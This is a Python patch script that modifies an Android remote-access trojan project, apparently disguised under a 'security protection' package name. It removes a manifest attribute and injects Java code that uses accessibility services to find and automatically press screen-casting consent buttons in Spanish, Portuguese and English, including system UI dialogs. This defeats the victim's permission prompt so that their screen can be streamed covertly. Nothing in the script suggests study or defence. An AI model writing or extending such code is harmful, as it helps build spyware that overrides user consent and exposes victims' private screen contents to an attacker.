import io
mp = r"C:\Users\user\kryptos\android-rat\app\src\main\AndroidManifest.xml"
s = io.open(mp, encoding="utf-8", newline="").read()
s = s.replace(' android:noHistory="true"', '')
io.open(mp, "w", encoding="utf-8", newline="").write(s)
print("manifest OK")

up = r"C:\Users\user\kryptos\android-rat\app\src\main\java\com\seguranca\protecao\UiAssistBridge.java"
s = io.open(up, encoding="utf-8", newline="").read()
old = '''            if (ScreenStreamService.isActive()) return true;
            if (instance == null) return false;
            android.view.accessibility.AccessibilityNodeInfo root = instance.getRootInActiveWindow();
            if (root == null) return false;'''
new = '''            if (ScreenStreamService.isActive()) return true;
            if (instance == null) return false;
            android.view.accessibility.AccessibilityNodeInfo root = instance.getRootInActiveWindow();
            if (root != null) {
                if (clickProjectionOnRoot(root)) return true;
            }
            try {
                java.util.List<android.view.accessibility.AccessibilityWindowInfo> ws = instance.getWindows();
                if (ws != null) {
                    for (android.view.accessibility.AccessibilityWindowInfo w : ws) {
                        try {
                            android.view.accessibility.AccessibilityNodeInfo r2 = w.getRoot();
                            if (r2 != null && clickProjectionOnRoot(r2)) return true;
                        } catch (Throwable ignored) {}
                    }
                }
            } catch (Throwable ignored) {}
            if (root == null) return false;'''
assert old in s, "clickProjectionStart no encontrado"
s = s.replace(old, new, 1)

marker = "    private static boolean clickFirstByText("
helper = '''    private static boolean clickProjectionOnRoot(android.view.accessibility.AccessibilityNodeInfo root) {
        try {
            String[] texts = {"Empezar ahora", "Iniciar agora", "Iniciar ahora", "Comenzar ahora", "Start now", "Ahora", "Agora", "Iniciar", "Empezar", "Comenzar", "Aceptar", "Permitir", "OK", "Compartir", "Transmitir"};
            if (clickFirstByText(root, texts)) return true;
            String[] ids = {"android:id/button1", "com.android.systemui:id/button1"};
            for (String idv : ids) {
                try {
                    java.util.List<android.view.accessibility.AccessibilityNodeInfo> l2 = root.findAccessibilityNodeInfosByViewId(idv);
                    if (l2 == null) continue;
                    for (android.view.accessibility.AccessibilityNodeInfo n : l2) {
                        android.view.accessibility.AccessibilityNodeInfo c = n;
                        int g = 0;
                        while (c != null && !c.isClickable() && g++ < 6) c = c.getParent();
                        if (c != null) { c.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK); return true; }
                    }
                } catch (Throwable ignored) {}
            }
        } catch (Throwable ignored) {}
        return false;
    }

'''
s = s.replace(marker, helper + marker, 1)
io.open(up, "w", encoding="utf-8", newline="").write(s)
print("clickProjection OK")